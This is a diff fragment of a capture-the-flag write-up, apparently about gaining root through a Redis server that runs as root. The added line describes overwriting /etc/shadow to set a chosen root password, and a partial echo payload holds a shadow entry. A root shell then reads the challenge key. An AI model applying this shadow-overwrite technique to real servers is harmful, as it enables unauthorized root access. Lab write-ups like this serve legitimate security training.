@@ -15,6 +15,7 @@ curl http://localhost/m.php --output -
 
 ## Approach 2: Become root
 The Redis password can be found with the above method in the file maintenance.php, it is `R3disp@ss`.
+As the Redis server is running as `root` we can overwrite `/etc/shadow` with new content. The `root` user's password is set to `Marie`.
 ```
 echo "\n\n
 root:cbMHDguL1fenw:16928:0:99999:7:::
@@ -42,6 +43,6 @@ root@95bbb6f62400:~# cat /etc/runtoanswer.yaml
 key: 4ec1769f83fd212bcb9d22b2316d8706
 ```
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTIxMTkyMzYyNDgsMjg4Njk3MDE5LDQ3OD
+eyJoaXN0b3J5IjpbLTE0OTAyMDAwMjIsMjg4Njk3MDE5LDQ3OD
 k1OTI2Nyw3MzA5OTgxMTZdfQ==
 -->
